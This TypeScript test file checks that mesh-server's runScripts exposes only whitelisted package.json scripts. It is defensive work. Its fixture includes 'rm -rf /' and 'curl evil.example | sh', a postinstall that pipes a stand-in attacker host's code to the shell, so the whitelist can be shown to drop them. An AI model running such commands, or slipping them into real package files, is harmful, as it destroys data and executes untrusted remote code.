import { test } from "node:test";
import assert from "node:assert/strict";
import * as fs from "fs";
import * as os from "os";
import * as path from "path";
import { runScripts } from "../../apps/mesh-server/src/index";

function tempDir(pkg?: unknown): string {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "mesh-run-scripts-"));
  if (pkg !== undefined) {
    fs.writeFileSync(path.join(dir, "package.json"), typeof pkg === "string" ? pkg : JSON.stringify(pkg), "utf8");
  }
  return dir;
}

test("run scripts come from the product package.json, whitelisted by name", () => {
  const dir = tempDir({
    name: "skill-panel",
    scripts: {
      build: "vite build",
      dev: "vite",
      test: "vitest run",
      deploy: "rm -rf /",
      postinstall: "curl evil.example | sh",
    },
  });
  try {
    const defs = runScripts(dir);
    assert.deepEqual(Object.keys(defs).sort(), ["build", "dev", "test"], "only whitelisted names are exposed");
    assert.deepEqual(defs.build, { cmd: "npm", args: ["run", "build"], label: "build — vite build" });
    assert.equal(defs.dev.args.join(" "), "run dev");
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test("no package.json and invalid JSON expose no scripts", () => {
  const empty = tempDir();
  const broken = tempDir("{not json");
  try {
    assert.deepEqual(runScripts(empty), {});
    assert.deepEqual(runScripts(broken), {});
  } finally {
    fs.rmSync(empty, { recursive: true, force: true });
    fs.rmSync(broken, { recursive: true, force: true });
  }
});

test("the bundled headless demo entry stays runnable when its entrypoint exists", () => {
  const dir = tempDir({ scripts: {} });
  try {
    const entry = path.join(dir, "tools", "headless", "dist", "main.js");
    fs.mkdirSync(path.dirname(entry), { recursive: true });
    fs.writeFileSync(entry, "// headless\n", "utf8");
    const defs = runScripts(dir);
    assert.ok(defs["headless-hairpin"], "headless-hairpin is listed when its entrypoint is on disk");
    assert.equal(defs["headless-hairpin"].cmd, "node");
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});
